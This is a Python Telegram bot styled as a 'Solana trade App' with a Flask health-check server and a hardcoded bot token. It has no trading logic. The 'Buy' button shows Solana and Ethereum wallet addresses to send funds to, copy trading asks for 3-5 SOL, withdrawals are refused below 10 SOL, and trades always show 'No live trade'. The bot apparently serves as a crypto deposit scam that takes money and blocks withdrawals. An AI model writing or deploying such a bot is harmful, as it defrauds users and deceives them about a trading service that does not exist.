import os
from flask import Flask
import threading

app = Flask(__name__)

@app.route('/')
def health_check():
    return "Bot is running!"

def run_flask():
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)

threading.Thread(target=run_flask, daemon=True).start()
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes

TOKEN = "8834930289:AAGmfpEcY8hVW8TTFYbdH6h5CSP90DdaNKg"

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # Set up the keyboard layout
    keyboard = [
        [KeyboardButton("Buy 🚀"), KeyboardButton("Sell ⚒️")],
        [KeyboardButton("Copy trade ⚡")],
        [KeyboardButton("Signal 📡"), KeyboardButton("Withdrawal 📤"), KeyboardButton("My Trade 📊")],
        [KeyboardButton("📦 History"), KeyboardButton("Position 📉"), KeyboardButton("Help 🙋‍♂️")],
        [KeyboardButton("Setting ⚙️"), KeyboardButton("DCA orders"), KeyboardButton("Referral 💰")]
    ]
    
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    
    await update.message.reply_text(
        "Welcome to Solana trade App!\n\nChoose an option from the menu below:",
        reply_markup=reply_markup
    )

async def handle_button_clicks(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_text = update.message.text

    if user_text == "Buy 🚀":
        # Using Markdown backticks allows the user to tap to copy the wallet addresses
        msg = (
            "Buy Solana now and start trading\n\n"
            "Wallet address\n"
            "Solana:\n"
            "`7HaHWKc7wiDzw8GzSCLpdZA8ksZCdVtmQUMekZ1gYJqu`\n"
            "(Tap to copy)\n\n"
            "Wallet address\n"
            "Ethereum:\n"
            "`0x8B1D0a25226DF6Ef99B223411A0516ae40803eaC`\n"
            "(Tap to copy)."
        )
        await update.message.reply_text(msg, parse_mode="Markdown")

    elif user_text == "Copy trade ⚡":
        await update.message.reply_text("You need a minimum of 3-5 SOL on your bot account to copy trade. Stakes are high.")

    elif user_text == "Withdrawal 📤":
        await update.message.reply_text("Minimum 10 SOL before withdrawal can be approved.")

    elif user_text == "My Trade 📊":
        await update.message.reply_text("No live trade")

    else:
        # Default response for other buttons
        await update.message.reply_text(f"You selected: {user_text}")

if __name__ == "__main__":
    app = ApplicationBuilder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_button_clicks))

    print("Bot is running...")
    app.run_polling()
    
